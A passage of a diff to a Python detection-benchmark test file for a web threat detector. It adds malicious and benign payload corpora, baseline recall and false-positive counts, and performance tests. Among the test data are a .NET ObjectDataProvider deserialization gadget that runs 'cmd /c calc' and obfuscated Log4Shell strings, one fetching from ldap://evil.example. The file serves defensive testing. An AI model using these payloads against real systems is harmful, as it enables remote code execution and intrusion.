+        "BAh7BkkiCGNtZAY6BkVUSSIGaWQGOwBU",
+    ),
+    MaliciousCase(
+        "deserialization_php_serializable_object_injection",
+        "deserialization",
+        'C:11:"ArrayObject":32:{x:i:0;a:0:{};m:a:0:{};}',
+    ),
+    MaliciousCase(
+        "deserialization_php_enum_serialization",
+        "deserialization",
+        'E:11:"Suit:Hearts";',
+    ),
+    MaliciousCase(
+        "deserialization_dotnet_objectdataprovider_xaml_gadget",
+        "deserialization",
+        '<ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/'
+        'winfx/2006/xaml/presentation"><ObjectDataProvider.MethodParameters>'
+        '<System:String xmlns:System="clr-namespace:System;assembly=mscorlib">'
+        "cmd /c calc</System:String></ObjectDataProvider.MethodParameters>"
+        "</ObjectDataProvider>",
+    ),
 ]
 
 BENIGN_CORPUS: list[BenignCase] = [
@@ -863,6 +1492,50 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "xss_docs_onerror_callback_explainer",
         "The onError callback receives the exception object as its only argument.",
+    ),
+    BenignCase(
+        "xss_custom_element_online_attribute_spaced_equals",
+        '<user-badge online = "true">Online</user-badge>',
+    ),
+    BenignCase(
+        "xss_log_line_online_once_attributes_spaced_equals",
+        "metric check: value < threshold, online = true, once = 1",
+    ),
+    BenignCase(
+        "xss_comparison_operator_onmessage_prose",
+        "value < threshold; onmessage = handler",
+    ),
+    BenignCase(
+        "xss_comparison_operator_onerror_prose",
+        "Set retries < 5 then bind onerror = fallback in the config block.",
+    ),
+    BenignCase(
+        "xss_comparison_operator_onclick_prose",
+        "chat: score < 10, level up! onclick = celebrate();",
+    ),
+    BenignCase(
+        "xss_comparison_operator_style_expression_prose",
+        "value < 5; style = expression(alert(1))",
+    ),
+    BenignCase(
+        "xss_comparison_operator_src_data_uri_prose",
+        "Set threshold < 10 and src = data:text/html,ok",
+    ),
+    BenignCase(
+        "xss_custom_element_oncall_attribute_spaced_equals",
+        '<staff-badge oncall = "true">On call</staff-badge>',
+    ),
+    BenignCase(
+        "xss_custom_element_onboarding_attribute_unspaced",
+        '<div onboarding="true">Welcome</div>',
+    ),
+    BenignCase(
+        "xss_div_oncustomthing_fictional_handler_not_reflected",
+        '<div oncustomthing="alert(1)">',
+    ),
+    BenignCase(
+        "xss_div_onpointerlockchange_non_reflected_handler",
+        '<div onpointerlockchange="alert(1)">',
     ),
     BenignCase(
         "sqli_prose_select_few_items",
@@ -936,6 +1609,42 @@ BENIGN_CORPUS: list[BenignCase] = [
         "URL-encoded spaces use %20 while encoded slashes use %2F.",
     ),
     BenignCase(
+        "path_traversal_benign_single_segment_relative_image",
+        "../assets/logo.png",
+    ),
+    BenignCase(
+        "path_traversal_benign_encoded_slash_without_dotdot",
+        "assets%2Flogo.png",
+    ),
+    BenignCase(
+        "path_traversal_benign_encoded_space_not_a_separator",
+        "..%20file",
+    ),
+    BenignCase(
+        "path_traversal_benign_encoded_slash_redirect_param",
+        "redirect=%2fdashboard",
+    ),
+    BenignCase(
+        "dir_traversal_benign_nfkc_ellipsis_dot_truncation_shape",
+        "….//path",
+    ),
+    BenignCase(
+        "dir_traversal_benign_loading_dots_progress_indicator",
+        "Loading........//please wait",
+    ),
+    BenignCase(
+        "dir_traversal_benign_document_section_reference",
+        "Section 4....//5",
+    ),
+    BenignCase(
+        "dir_traversal_benign_version_string_with_slashes",
+        "v1.2.3....//legacy",
+    ),
+    BenignCase(
+        "dir_traversal_benign_glob_pattern_query_value",
+        "glob=**/....//node_modules",
+    ),
+    BenignCase(
         "cmd_injection_markdown_ls_mention", "Run `ls` to list files in the directory."
     ),
     BenignCase(
@@ -958,6 +1667,14 @@ BENIGN_CORPUS: list[BenignCase] = [
     ),
     BenignCase("cmd_injection_shell_docs_var_expansion", "export PATH=${HOME}/bin"),
     BenignCase(
+        "cmd_injection_shell_path_mention_without_flag",
+        "The path /bin/sh is the default shell on many systems.",
+    ),
+    BenignCase(
+        "cmd_injection_env_command_mention_without_shell",
+        "Check your `env` for the missing `PATH` entry.",
+    ),
+    BenignCase(
         "cmd_injection_changelog_reboot_mention",
         "The `reboot` command now requires confirmation.",
     ),
@@ -968,6 +1685,15 @@ BENIGN_CORPUS: list[BenignCase] = [
     BenignCase(
         "cmd_injection_commit_message_docker_bump",
         "chore: bump `docker` base image to 3.12-slim",
+    ),
+    BenignCase(
+        "cmd_injection_sql_dotted_qualified_identifier",
+        "SELECT `u`.`id` FROM `users` `u` JOIN `orders` `o` ON `u`.`id` = `o`.`uid`",
+    ),
+    BenignCase(
+        "cmd_injection_json_wrapped_backtick_value",
+        '{"tip": "use `curl` to fetch the resource", "example": "`wget` the release '
+        'archive"}',
     ),
     BenignCase("file_inclusion_ordinary_https_url", "https://example.com/path?a=1"),
     BenignCase("file_inclusion_ordinary_http_url", "http://example.com"),
@@ -985,6 +1711,61 @@ BENIGN_CORPUS: list[BenignCase] = [
     ),
     BenignCase("file_inclusion_ipv6_literal_url", "https://[2001:db8::1]/path"),
     BenignCase("file_inclusion_ftp_url", "ftp://ftp.example.com/pub/file.txt"),
+    BenignCase(
+        "file_inclusion_redirect_uri_callback",
+        "redirect_uri=https://myapp.com/callback",
+    ),
+    BenignCase("file_inclusion_next_dashboard", "next=https://example.com/dashboard"),
+    BenignCase("file_inclusion_url_cdn_asset", "url=https://cdn.example.com/asset.js"),
+    BenignCase("file_inclusion_return_home", "return=https://example.com/home"),
+    BenignCase(
+        "file_inclusion_returnto_profile",
+        "returnTo=https://app.example.com/profile",
+    ),
+    BenignCase(
+        "file_inclusion_continue_checkout",
+        "continue=https://shop.example.com/checkout",
+    ),
+    BenignCase(
+        "file_inclusion_callback_oauth",
+        "callback=https://auth.example.com/oauth/complete",
+    ),
+    BenignCase(
+        "file_inclusion_benign_readme_txt_link",
+        "download=https://raw.githubusercontent.com/user/repo/main/README.txt",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_docs_readme_txt_link",
+        "return=https://example.com/docs/readme.txt",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_terms_txt_link",
+        "file=https://example.com/legal/terms.txt",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_installer_sh_link",
+        "url=https://example.com/install.sh",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_docker_installer_sh_link",
+        "url=https://get.docker.com/install.sh",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_cgi_search_link",
+        "url=https://legacy.example.com/cgi-bin/search.cgi",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
     BenignCase(
         "ldap_prose_wildcard_search_mention",
         "Use an asterisk wildcard in your search query to match partial names.",
@@ -1120,12 +1901,24 @@ BENIGN_CORPUS: list[BenignCase] = [
         "nosql_prose_aggregation_pipeline",
         "MongoDB aggregation pipelines chain multiple stage operators together.",
     ),
+    BenignCase("nosql_benign_bare_bracket_empty_array", "arr[]=1"),
+    BenignCase("nosql_benign_bare_bracket_object_key", "obj[key]=val"),
+    BenignCase("nosql_benign_bare_bracket_numeric_index", "order[0]=asc"),
+    BenignCase("nosql_benign_bare_bracket_status_key", "filter[status]=active"),
+    BenignCase("nosql_benign_bare_bracket_nested_index", "items[2][name]=x"),
     BenignCase("file_upload_benign_png_filename", 'filename="avatar.png"'),
     BenignCase("file_upload_benign_pdf_filename", 'filename="invoice.pdf"'),
     BenignCase("file_upload_benign_docx_filename", "filename='report.docx'"),
     BenignCase(
         "file_upload_prose_upload_limits",
         "Uploaded files are limited to 10 MB and must be JPEG or PNG.",
+    ),
+    BenignCase(
+        "file_upload_prose_ticket_dangerous_filename_spaced_equals",
+        "Ticket #4821: please confirm the attachment filename = "
+        '"invoice.php" was renamed correctly before closing.',
+        "production",
+        _FILENAME_MENTIONED_IN_PROSE_WITH_SPACED_EQUALS_KNOWN_FP_REASON,
     ),
     BenignCase("file_upload_benign_pptx_filename", 'filename="presentation.pptx"'),
     BenignCase(
@@ -1254,6 +2047,9 @@ BENIGN_CORPUS: list[BenignCase] = [
         "proto_pollution_benign_constructor_value",
         '{"user": {"name": "alice", "constructor": "Employee"}}',
     ),
+    BenignCase("proto_pollution_benign_constructor_name_access", "a.constructor.name"),
+    BenignCase("proto_pollution_benign_bare_constructor_param", "constructor"),
+    BenignCase("proto_pollution_benign_bare_prototype_param", "prototype"),
     BenignCase(
         "code_injection_prose_reflection_explainer",
         "Reflection lets a program inspect its own types at runtime.",
@@ -1695,36 +2491,322 @@ BENIGN_CORPUS: list[BenignCase] = [
         "sensitive_file_prose_compliance_checklist_dotenv_audit_trail",
         "The compliance checklist references /var/www/.env for the audit trail.",
     ),
+    BenignCase(
+        "cmd_injection_semicolon_prefixed_deploy_script_flag",
+        "; ./deploy.sh -f",
+    ),
+    BenignCase(
+        "cmd_injection_bare_run_script_flag",
+        "scripts/run.sh -v",
+    ),
+    BenignCase(
+        "cmd_injection_prose_lint_script_flag_reminder",
+        "Run ./scripts/lint.sh -v before pushing.",
+    ),
+    BenignCase(
+        "rest_path_k8s_default_namespace_bare",
+        "/api/v1/namespaces/default",
+    ),
+    BenignCase(
+        "cmd_injection_prose_semicolon_quoted_absolute_shell_ls",
+        "First run setup; /bin/sh -c 'ls' to verify.",
+        "production",
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_prose_semicolon_quoted_absolute_shell_whoami",
+        "ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
+        "production",
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_prose_semicolon_quoted_env_prefixed_shell",
+        "runbook step 3: restart the shell; /usr/bin/env bash -c "
+        "'systemctl restart app'",
+        "production",
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_prose_semicolon_quoted_absolute_shell_debug_flag",
+        "changelog: fixed default login; /bin/sh -x debug.sh now traces correctly",
+        "production",
+        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_prose_semicolon_bare_shell_control",
+        "First run setup; sh -c 'ls' to verify.",
+        "production",
+        _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_value_absolute_shell_c_npm_start",
+        "/bin/sh -c 'npm start'",
+        "production",
+        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_value_absolute_bash_login_flag",
+        "/bin/bash -l",
+        "production",
+        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_value_env_prefixed_bash_c_echo",
+        "/usr/bin/env bash -c 'echo hi'",
+        "production",
+        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_value_bare_shell_control",
+        "sh -c 'npm start'",
+        "production",
+        _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_ci_yaml_env_prefixed_run_step",
+        "steps:\n  - run: |\n      FOO=bar BAZ=qux bash -c 'echo hi'",
+        "production",
+        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_crontab_env_prefixed_backup_line",
+        "5 4 * * * root\nPATH=/usr/bin:/bin bash -c 'do_backup.sh'",
+        "production",
+        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "cmd_injection_makefile_env_prefixed_recipe",
+        "target:\n\tFOO=1 BAR=2 bash -c 'do_thing'",
+        "production",
+        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "ldap_glob_paren_null_mention",
+        "glob pattern: *)%00 in filenames",
+    ),
+    BenignCase(
+        "cmd_injection_sql_update_set_equals_backtick",
+        "UPDATE t SET a=`b` WHERE id=1",
+    ),
+    BenignCase(
+        "cmd_injection_query_string_equals_ampersand_backtick",
+        "sort=`created_at`&order=asc",
+    ),
+    BenignCase(
+        "cmd_injection_query_string_ampersand_equals_backtick",
+        "a=1&`b`=2",
+    ),
+    BenignCase(
+        "cmd_injection_assignment_equals_backtick_value",
+        "value=`cmd`",
+    ),
+    BenignCase(
+        "cmd_injection_url_query_param_equals_backtick",
+        "https://example.com/search?q=`test`",
+    ),
+    BenignCase(
+        "cmd_injection_sql_select_from_no_space_backtick",
+        "SELECT`id`FROM users",
+    ),
+    BenignCase(
+        "cmd_injection_json_expr_equals_backtick",
+        '{"expr": "x=`y`"}',
+    ),
+    BenignCase(
+        "cmd_injection_cjk_chinese_backtick_curl_mention",
+        "请使用`curl`命令下载文件",
+    ),
+    BenignCase(
+        "cmd_injection_cjk_japanese_backtick_npm_mention",
+        "実行するには`npm`を使ってください",
+    ),
+    BenignCase(
+        "cmd_injection_cjk_korean_backtick_id_mention",
+        "사용법은`id`명령을 참고하세요",
+    ),
+    BenignCase(
+        "cmd_injection_glued_kebab_identifier_header_forward",
+        "header`x-forwarded-for`value",
+    ),
+    BenignCase(
+        "cmd_injection_glued_kebab_identifier_config_well_known",
+        "config`well-known`here",
+    ),
+    BenignCase(
+        "cmd_injection_glued_plausible_token_ref_user_list",
+        "ref`user`list",
+    ),
+    BenignCase(
+        "cmd_injection_jquery_selector_bare_id_call",
+        "$(id).addClass('active');",
+    ),
+    BenignCase(
+        "cmd_injection_jquery_selector_hash_id_call",
+        "$('#submit-button').on('click', handleSubmit);",
+    ),
+    BenignCase(
+        "cmd_injection_js_template_dotted_prop",
+        "const label = `Welcome ${obj.prop}`;",
+    ),
+    BenignCase(
+        "cmd_injection_js_template_bare_var_brace",
+        "const path = `/users/${id}`;",
+    ),
+    BenignCase(
+        "xss_prose_bare_on_word_assignment_no_tag",
+        "changelog: onboarding=complete and onward=next for the release",
+    ),
+    BenignCase(
+        "ssrf_email_userinfo_localhost_domain_no_scheme",
+        "System alerts are emailed to root@localhost by the nightly cron job.",
+    ),
+    BenignCase("ssrf_userinfo_email_style_public_domain", "user@example.com"),
+    BenignCase(
+        "xss_href_quoted_onboarding_path_slash_sep",
+        '<a href="/onboarding">Get started</a>',
+    ),
+    BenignCase(
+        "xss_src_quoted_only_prefixed_path_slash_sep",
+        '<img src="/only-in-stock.png" alt="badge">',
+    ),
+    BenignCase(
+        "xss_href_quoted_once_prefixed_path_slash_sep",
+        '<link rel="stylesheet" href="/once-cache.css">',
+    ),
+    BenignCase("template_benign_curly_user_name", "{{ user.name }}"),
+    BenignCase("template_benign_curly_title", "{{ title }}"),
+    BenignCase("template_benign_curly_count", "{{ count }}"),
+    BenignCase("template_benign_hash_brand_color", "#{brandColor}"),
+    BenignCase("template_benign_hash_user_name", "#{user.name}"),
+    BenignCase(
+        "template_fp_date_curly_brace",
+        "{{ 2024-01-02 }}",
+        "production",
+        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "template_fp_date_hash_brace",
+        "#{2024-12-31}",
+        "production",
+        _SSTI_DATE_IN_BRACES_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "template_fp_call_branch_format_x",
+        "{{ format(x) }}",
+        "production",
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "template_fp_call_branch_round_filter",
+        "{{ item.price | round(2) }}",
+        "production",
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "template_fp_call_branch_helper_format",
+        "#{ helper.format(value) }",
+        "production",
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "template_fp_call_branch_map_arrow",
+        "{{ cart.items.map(item => item.price) }}",
+        "production",
+        _SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON,
+    ),
+    BenignCase("ssrf_benign_single_at_token_userinfo", "https://token@api.example.com"),
+    BenignCase("ssrf_benign_single_at_userpass", "http://user:pass@host.com"),
+    BenignCase("ssrf_benign_email_param", "email=a@b.com"),
+    BenignCase("sensitive_file_benign_leading_tilde_home", "~/home"),
+    BenignCase("sensitive_file_benign_bare_tilde_user", "~user"),
+    BenignCase(
+        "sensitive_file_benign_midstring_tilde_report",
+        "/files/report~draft.txt",
+    ),
+    BenignCase("sqli_benign_multi_value_semicolon_pair", "a=1;b=2"),
+    BenignCase("sqli_benign_sort_order_semicolon_pair", "sort=name;order=asc"),
+    BenignCase("sqli_benign_semicolon_select_no_from", "; select all options"),
+    BenignCase("sqli_benign_semicolon_update_no_set", "note; update your profile"),
+    BenignCase("sqli_benign_semicolon_execute_no_proc", "; execute the plan"),
+    BenignCase("sqli_benign_exec_bareword_call_shape", "execute report()"),
+    BenignCase("sqli_benign_exec_qualified_proc_name", "EXEC dbo.Proc()"),
+    BenignCase(
+        "sqli_where_equals_question_mark_placeholder",
+        "SELECT id FROM users WHERE id = ?",
+    ),
+    BenignCase(
+        "sqli_where_equals_named_colon_placeholder",
+        "SELECT id FROM users WHERE id = :id",
+    ),
+    BenignCase(
+        "sqli_where_equals_named_at_placeholder",
+        "SELECT id FROM users WHERE id = @id",
+    ),
+    BenignCase(
+        "sqli_where_equals_dbapi_percent_s_placeholder",
+        "SELECT id FROM users WHERE id = %s",
+    ),
+    BenignCase(
+        "sqli_where_equals_dbapi_named_percent_placeholder",
+        "SELECT id FROM users WHERE id = %(id)s",
+    ),
+    BenignCase(
+        "sqli_where_equals_dollar_numbered_placeholder",
+        "SELECT id FROM users WHERE id = $1",
+    ),
+    BenignCase(
+        "sqli_where_equals_mybatis_hash_brace_placeholder",
+        "SELECT id FROM users WHERE id = #{id}",
+    ),
+    BenignCase(
+        "sqli_boolean_two_columns_or",
+        "SELECT id FROM sessions WHERE status = 1 OR verified = 2",
+    ),
+    BenignCase(
+        "sqli_boolean_bare_columns_or",
+        "SELECT id FROM sessions WHERE active OR admin",
+    ),
 ]
 
 BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
-    "cmd_injection": 22,
-    "cms_probing": 9,
+    "cmd_injection": 37,
+    "cms_probing": 10,
     "code_injection": 3,
-    "dir_traversal": 8,
-    "file_inclusion": 8,
-    "file_upload": 6,
+    "deserialization": 18,
+    "dir_traversal": 9,
+    "file_inclusion": 16,
+    "file_upload": 32,
     "http_split": 4,
-    "ldap": 6,
-    "nosql": 6,
-    "path_traversal": 5,
-    "proto_pollution": 5,
-    "recon": 22,
-    "sensitive_file": 8,
-    "sqli": 19,
-    "ssrf": 24,
-    "template": 6,
+    "ldap": 12,
+    "nosql": 10,
+    "path_traversal": 13,
+    "proto_pollution": 8,
+    "recon": 23,
+    "sensitive_file": 11,
+    "sqli": 36,
+    "ssrf": 28,
+    "template": 13,
     "xml": 4,
-    "xss": 14,
+    "xss": 39,
 }
-BASELINE_MALICIOUS_DETECTED_TOTAL = 179
+BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION = 320
+BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE = 318
 
-BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {}
-BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 0
+BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {
+    "cmd_injection": 12,
+    "file_inclusion": 6,
+    "file_upload": 1,
+    "template": 6,
+}
+BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 25
+
+_WALL_TIME_CEILING_SECONDS = 30.0
 
 
-def _malicious_case_detected_categories(case: MaliciousCase) -> set[str]:
-    detector = _DETECTORS[case.detector]
+def _malicious_case_detected_categories(
+    case: MaliciousCase, detectors: dict[str, SusPatternsManager]
+) -> set[str]:
+    detector = detectors[case.detector]
     result = detector.detect(
         content=case.payload, ip_address="203.0.113.9", context="request_body"
     )
@@ -1733,8 +2815,10 @@ def _malicious_case_detected_categories(case: MaliciousCase) -> set[str]:
     return {threat.get("category") for threat in result["threats"]}
 
 
-def _benign_case_flagged_categories(case: BenignCase) -> set[str]:
-    detector = _DETECTORS[case.detector]
+def _benign_case_flagged_categories(
+    case: BenignCase, detectors: dict[str, SusPatternsManager]
+) -> set[str]:
+    detector = detectors[case.detector]
     result = detector.detect(
         content=case.payload, ip_address="198.51.100.4", context="request_body"
     )
@@ -1828,7 +2912,7 @@ def test_detection_benchmark_recall_and_false_positive_rate() -> None:
         malicious_total_by_category[malicious_case.category] = (
             malicious_total_by_category.get(malicious_case.category, 0) + 1
         )
-        hit_categories = _malicious_case_detected_categories(malicious_case)
+        hit_categories = _malicious_case_detected_categories(malicious_case, _DETECTORS)
         if malicious_case.category in hit_categories:
             malicious_detected_by_category[malicious_case.category] = (
                 malicious_detected_by_category.get(malicious_case.category, 0) + 1
@@ -1842,7 +2926,7 @@ def test_detection_benchmark_recall_and_false_positive_rate() -> None:
     benign_flagged_total = 0
     unexpected_false_positive_case_ids: list[str] = []
     for benign_case in BENIGN_CORPUS:
-        hit_categories = _benign_case_flagged_categories(benign_case)
+        hit_categories = _benign_case_flagged_categories(benign_case, _DETECTORS)
         if hit_categories:
             benign_flagged_total += 1
             if not benign_case.known_false_positive_reason:
@@ -1877,8 +2961,9 @@ def test_detection_benchmark_recall_and_false_positive_rate() -> None:
             f"{report}"
         )
 
-    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
-        f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
+    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION, (
+        f"overall recall regressed: "
+        f"baseline={BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION} "
         f"actual={malicious_detected_total}\n{report}"
     )
 
@@ -1896,3 +2981,297 @@ def test_detection_benchmark_recall_and_false_positive_rate() -> None:
         f"actual={benign_flagged_total} "
         f"unexpected={unexpected_false_positive_case_ids}\n{report}"
     )
+
+    assert wall_time_seconds < _WALL_TIME_CEILING_SECONDS * _cov_scale(), (
+        f"detection benchmark wall time regressed: "
+        f"ceiling={_WALL_TIME_CEILING_SECONDS}s actual={wall_time_seconds:.3f}s"
+    )
+
+
+_NON_BACKTICK_PERF_CORPUS: list[str] = [
+    case.payload
+    for case in list(MALICIOUS_CORPUS) + list(BENIGN_CORPUS)
+    if "`" not in case.payload
+]
+
+_BACKTICK_PERF_CEILING_SECONDS = 30.0
+
+
+def test_glued_backtick_discriminator_perf_on_non_backtick_content() -> None:
+    assert len(_NON_BACKTICK_PERF_CORPUS) >= 100
+
+    def _scan_corpus_once() -> float:
+        start = time.monotonic()
+        for payload in _NON_BACKTICK_PERF_CORPUS:
+            _PRODUCTION_MANAGER.detect(
+                content=payload, ip_address="203.0.113.9", context="request_body"
+            )
+        return time.monotonic() - start
+
+    _scan_corpus_once()
+    durations = sorted([_scan_corpus_once() for _ in range(5)])
+    median_seconds = durations[len(durations) // 2]
+
+    print(
+        f"glued backtick discriminator perf on {len(_NON_BACKTICK_PERF_CORPUS)} "
+        f"non-backtick payloads: median={median_seconds:.4f}s "
+        f"runs={[f'{d:.4f}' for d in durations]}"
+    )
+
+    assert median_seconds < _BACKTICK_PERF_CEILING_SECONDS * _cov_scale(), (
+        f"non-backtick detection pass got {median_seconds:.4f}s, "
+        f"more than {_BACKTICK_PERF_CEILING_SECONDS}s for "
+        f"{len(_NON_BACKTICK_PERF_CORPUS)} payloads"
+    )
+
+
+def test_detection_benchmark_legacy_smoke() -> None:
+    malicious_detected_total = 0
+    for malicious_case in MALICIOUS_CORPUS:
+        hit_categories = _malicious_case_detected_categories(
+            malicious_case, _LEGACY_SMOKE_DETECTORS
+        )
+        if malicious_case.category in hit_categories:
+            malicious_detected_total += 1
+
+    benign_flagged_total = 0
+    for benign_case in BENIGN_CORPUS:
+        hit_categories = _benign_case_flagged_categories(
+            benign_case, _LEGACY_SMOKE_DETECTORS
+        )
+        if hit_categories:
+            benign_flagged_total += 1
+
+    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE, (
+        f"legacy singleton recall regressed: "
+        f"baseline={BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE} "
+        f"actual={malicious_detected_total}"
+    )
+    assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
+        f"legacy singleton false-positive rate rose: "
+        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} actual={benign_flagged_total}"
+    )
+
+
+_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON = (
+    "a bare single-token $(...)/${...} substitution is deliberately "
+    "context-gated to query_param/url_path so it stays detected there "
+    "as a deliberate detection-with-disclosure choice: the jQuery "
+    "$(id)/$('#x') selector, the "
+    "${HOME} shell-doc var expansion, the Makefile $(CC)/$(CFLAGS) mention, "
+    "and the ${amount} template placeholder are character-identical to that "
+    "attack shape as raw query-string or path-segment values, so they are "
+    "flagged there too, and stay correctly benign in request_body, where "
+    "the branch never fires. Resolved toward recall: detecting $(id)/$(w)/"
+    "$(who)/$(groups)/$(set)/${IFS}-shaped command substitution outweighs "
+    "these five documented, disclosed false positives"
+)
+
+_DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES = [
+    pytest.param(
+        "cmd_injection_shell_docs_var_expansion",
+        "export PATH=${HOME}/bin",
+        id="shell_docs_var_expansion",
+    ),
+    pytest.param(
+        "template_benign_dollar_brace_var",
+        "Set the amount with ${amount} in the template.",
+        id="template_dollar_brace_var",
+    ),
+    pytest.param(
+        "template_benign_makefile_variable",
+        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
+        id="template_makefile_variable",
+    ),
+    pytest.param(
+        "cmd_injection_jquery_selector_bare_id_call",
+        "$(id).addClass('active');",
+        id="jquery_selector_bare_id_call",
+    ),
+    pytest.param(
+        "cmd_injection_jquery_selector_hash_id_call",
+        "$('#submit-button').on('click', handleSubmit);",
+        id="jquery_selector_hash_id_call",
+    ),
+]
+
+
+@pytest.mark.parametrize(
+    "case_id, payload", _DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES
+)
+@pytest.mark.parametrize("context", ["query_param", "url_path"])
+def test_dollar_substitution_disclosed_false_positive_detected(
+    case_id: str, payload: str, context: str
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="203.0.113.9", context=context
+    )
+    assert result["is_threat"] is True, (
+        f"{case_id} expected to be a disclosed false positive in {context}: "
+        f"{_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON}"
+    )
+
+
+_LOG4SHELL_URL_PATH_BONUS_PAYLOADS = [
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+    pytest.param(
+        "${${lower:j}ndi:ldap://evil.example/a}",
+        id="log4shell_obfuscated_nested_full_exploit",
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", _LOG4SHELL_URL_PATH_BONUS_PAYLOADS)
+def test_log4shell_obfuscated_payload_detected_in_url_path(
+    payload: str,
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="203.0.113.9", context="url_path"
+    )
+    assert result["is_threat"] is True
+
+
+_VAR_ASSIGNMENT_PREFIXED_SHELL_DASH_C_DISCLOSED_FALSE_POSITIVES = [
+    pytest.param(
+        "cmd_injection_ci_yaml_env_prefixed_run_step",
+        "steps:\n  - run: |\n      FOO=bar BAZ=qux bash -c 'echo hi'",
+        id="ci_yaml_run_step",
+    ),
+    pytest.param(
+        "cmd_injection_crontab_env_prefixed_backup_line",
+        "5 4 * * * root\nPATH=/usr/bin:/bin bash -c 'do_backup.sh'",
+        id="crontab_backup_line",
+    ),
+    pytest.param(
+        "cmd_injection_makefile_env_prefixed_recipe",
+        "target:\n\tFOO=1 BAR=2 bash -c 'do_thing'",
+        id="makefile_recipe",
+    ),
+]
+
+
+@pytest.mark.parametrize(
+    "case_id, payload",
+    _VAR_ASSIGNMENT_PREFIXED_SHELL_DASH_C_DISCLOSED_FALSE_POSITIVES,
+)
+def test_var_assignment_prefixed_shell_dash_c_disclosed_false_positive_detected(
+    case_id: str, payload: str
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="198.51.100.4", context="request_body"
+    )
+    assert result["is_threat"] is True, (
+        f"{case_id} expected to be a disclosed false positive: "
+        f"{_ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON}"
+    )
+    hit_categories = {threat.get("category") for threat in result["threats"]}
+    assert "cmd_injection" in hit_categories, (
+        f"{case_id} expected to fire cmd_injection specifically, got {hit_categories}"
+    )
+
+
+_EVENT_HANDLER_ALLOWLIST_COVERAGE_CLIFF_PAYLOADS = [
